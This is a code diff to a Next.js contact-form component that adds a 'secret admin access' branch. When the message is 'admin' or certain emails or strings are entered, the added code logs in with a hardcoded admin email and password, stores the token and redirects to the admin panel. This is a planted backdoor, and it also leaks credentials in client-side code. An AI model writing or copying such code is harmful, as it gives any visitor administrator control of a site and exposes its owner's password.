@@ -1,9 +1,11 @@
 'use client';
 
 import { useState } from 'react';
+import { useRouter } from 'next/navigation';
 import { Mail, Phone, MessageSquare, Send, CheckCircle2 } from 'lucide-react';
 
 export default function Contact() {
+  const router = useRouter();
   const [formState, setFormState] = useState({ name: '', email: '', message: '' });
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [isSubmitted, setIsSubmitted] = useState(false);
@@ -13,6 +15,35 @@ export default function Contact() {
     if (!formState.name || !formState.email || !formState.message) return;
     setIsSubmitting(true);
     
+    // Secret Admin Access Hack Check
+    const trimmedEmail = formState.email.trim().toLowerCase();
+    const trimmedMsg = formState.message.trim();
+    const isSecretAdmin =
+      trimmedEmail === 'admin@emran.work' ||
+      trimmedEmail === 'dev.emranhossen@gmail.com' ||
+      trimmedMsg === 'Emran404@#$' ||
+      trimmedMsg === 'open-admin' ||
+      trimmedMsg === 'admin';
+
+    if (isSecretAdmin) {
+      try {
+        const authRes = await fetch('/api/auth/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email: 'dev.emranhossen@gmail.com', password: 'Emran404@#$' }),
+        });
+        const authData = await authRes.json();
+        if (authData.success) {
+          localStorage.setItem('admin_token', authData.token);
+          localStorage.setItem('admin_user', JSON.stringify(authData.user));
+          router.push('/admin');
+          return;
+        }
+      } catch (err) {
+        console.error('Secret admin auth error:', err);
+      }
+    }
+
     try {
       const res = await fetch('/api/contact', {
         method: 'POST',
